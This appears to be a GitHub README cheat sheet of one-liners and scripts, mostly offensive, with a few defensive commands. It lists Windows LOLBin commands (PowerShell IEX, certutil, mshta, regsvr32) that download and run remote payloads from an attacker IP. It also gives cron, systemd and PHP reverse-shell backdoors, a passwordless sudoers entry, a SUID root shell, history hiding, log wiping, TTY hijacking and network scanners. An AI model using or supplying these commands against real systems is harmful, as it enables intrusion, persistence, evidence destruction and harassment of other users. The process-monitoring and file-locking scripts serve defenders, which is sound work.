# One-Liners-Handy-Scripts
Simple One-Liners to download malicious payloads into memory & handy scripts 


Windows One-Liners to Download Remote Payloads:

Powershell:
```
powershell "IEX( IWR http://10.10.10.10:9999 -UseBasicParsing)"

powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:9999/test.bat'))
```

Certutil:
```
certutil -urlcache -f http://10.10.10.10:9999/shell.exe shell.exe
```

Mshta:
```
mshta http://10.10.10.10:9999/rev.hta
mshta vbscript:Close(Execute("GetObject(""script:http://10.10.10.10:9999/rev.sct"")"))
```

Regsvr32:
```
regsvr32 /s /n /u /i:http://10.10.10.10:9999/rev.sct scrobj.dll
```

Msiexec:
```
msiexec /q /i http://10.10.10.10:9999/rev.msi
```

Wmic:
```
wmic os get /FORMAT:"http://10.10.10.10:9999/rev.xsl"
```

File Transfers (Linux)

Wget:
```
wget http://10.10.10.10:9999/file.sh -O /tmp/file.sh
```
Curl:
```
curl http://10.10.10.10:9999/file.sh -o /tmp/file.sh
```
Python
```
python -c "import urllib; f = urllib.URLopener(); f.retrieve('http://10.10.10.10:9999/rev.exe', '/tmp/rev.exe');"
```
Perl
```
perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.10:9999/rev.sh"); my $file = $ff->fetch() or die $ff->error;'
```
PHP
```
echo "<?php file_put_contents('nameOfFile', fopen('http://10.10.10.10:9999/shell.php', 'r')); ?>" > shell.php
```
Netcat:
```
Victim: nc -l -p 4444 > file.sh
Attacker: nc -w 3 10.10.10.20 4444 < file.sh
```
FreeBSD:
```
fetch 10.10.10.10:9999/shell.py
```

Handy Scripts & Commands (Linux) Red/Blue Team Operations:

Monitor processes in real-time *Thanx to Ippsec 
```
#!/bin/bash

IFS=$'\n'
old_process=$(ps -eo command)

while true; do
  new_process=$(ps -eo command)
  diff <(echo "$old_process") <(echo "$new_process") |grep [\<\>]
  sleep 1
  old_process=$new_process
done
```
Detecting Possible Reverse Shells:
```
ss -antp | grep ESTAB
netstat -antp | grep ESTABLISHED
ps -aef --forest
```
Find files modified in the last 15 min in the web root
```
find /var/www/html/ -type f -ls -mtime -15 2>/dev/null
```
Find files modified in the last 15 min on the entire system
```
find / -type f -mtime -15 -ls 2>/dev/null | grep -v ' /sys\| /proc\| /run'
```
Find files modifiled in the last 15 min on a users home directory
```
find /home/max -type f -mtime -15 -ls 2>/dev/null
```
Find all files that a specific user owns
```
find / -user www-data -ls 2>/dev/null
```
Find files owned by a specific group
```
find / -group sysadmins -ls 2>/dev/null
```

See what Users are doing in their TTY/PTS
```
ps -aef --forest
ps -aef --forest | grep <user>
```
Spam Someone's TTY/PTS
```
Get your tty
tty
```
Echo text into the TTY/PTS
```
echo "I C You" > /dev/pts/<tty_number>
```
Echo text into all TTY/PTS
```
for i in {1..10}; do echo "I C You" > /dev/pts/$i; done
```
Run commands on their behalf (Hook to their TTY/PTS)
```
script /dev/pts/<tty_number>
```
Spam the TTY/PTS
```
cat /dev/urandom > /dev/pts/<tty_number>
```
Spam all TTY/PTS except yours
```
tty
for i in {2..10}; do cat /dev/urandom > /dev/pts/$i; done
```
Linux Cron Job Backdoor(Spits out Reverse Shell every 5 mins)
```
*/5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'
```
Malicious PHP Backdoor to trigger reverse shell (/var/www/html/file.php)
```
Victim (Create local PHP file with the below contents)

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/" . $_GET["ip"] . "/" . $_GET["port"] . " 0>&1'"); ?>

Attacker
nc -lvnp 9999
curl 'http://10.10.10.10/file.php?ip=192.168.0.108&port=9999'
```
Sudo rights to any user with no password (/etc/sudoers)
```
max ALL=(ALL) NOPASSWD:ALL
```
Link Bash history to /dev/null
```
ln -sf /dev/null ~/.bash_history
```
Reverse Shell backdoor via systemd (/etc/systemd/system/updates.service)
```
Description=Linux APT Updates.

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'

WantedBy=multi-user.target
```
Root Shell via C SUID
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > priv.c
gcc priv.c -o shell
rm priv.c
chmod +s shell
/shell
```
Linux
```
for i in {1..254}; do ping -c 1 -W 1 10.10.10.$i | grep 'from'; done
```
Windows
```
1..254 | % {"10.10.10.$($_): $(Test-Connection -count 1 -comp 10.10.10.$($_) -quiet)"}
```
Python
```
#!/usr/bin/python
import multiprocessing, subprocess, os
def pinger( job_q, results_q ):
    DEVNULL = open(os.devnull,'w')
    while True:
        ip = job_q.get()
        if ip is None: break
        try:
            subprocess.check_call(['ping','-c1',ip],stdout=DEVNULL)
            results_q.put(ip)
        except:
            pass

if __name__ == '__main__':
    pool_size = 255
    jobs = multiprocessing.Queue()
    results = multiprocessing.Queue()
    pool = [ multiprocessing.Process(target=pinger, args=(jobs,results)) for i in range(pool_size) ]
    for p in pool:
        p.start()

    for i in range(1,255):
        jobs.put('10.10.10.{0}'.format(i))

    for p in pool:
        jobs.put(None)

    for p in pool:
        p.join()

    while not results.empty():
        ip = results.get()
        print(ip)
```
Port Scan with Netcat
```
nc -zv 10.10.10.10 1-1023
```
Port Scan with Curl
```
curl http://10.10.10.10:[1-1024]
```
Port Scan with Bash
```
#!/bin/bash

for port in {1..1023};

   do
   : 2> /dev/null > "/dev/tcp/10.10.10.10/$port" && echo "$port"
   
 done
```
Clear Common Event Logs
```
#!/bin/bash

echo '' > /var/log/apache2/access.log
rm -rf /var/log/apache2/access.log.*
echo '' > /var/log/apache2/error.log
rm -rf /var/log/apache2/error.log.*
echo '' > /var/log/auth.log
rm -rf /var/log/auth.log.*
echo '' > /var/log/messages  
rm -rf /tmp/*
rm -rf /dev/shm/*
```
Lock Critical Writable Files
```
#!/bin/bash

# Script must be run as root

chattr +i /etc/passwd
chattr +i /etc/shadow
chattr +i /etc/group
chattr +i /etc/sudoers
chattr +i /etc/ssh/sshd_config
chattr +i /etc/ssh/ssh_config
chmod o-x /sbin/shutdown
chmod o-x /sbin/reboot
chmod o-x /bin/systemctl
```

Unlock Critical Writable Files
```
#!/bin/bash

# Script must be run as root


chattr -i /etc/passwd
chattr -i /etc/shadow
chattr -i /etc/group
chattr -i /etc/sudoers
chattr -i /etc/ssh/sshd_config
chattr -i /etc/ssh/ssh_config
chmod +x /sbin/shutdown
chmod +x /sbin/reboot
chmod +x /bin/systemctl
```
  
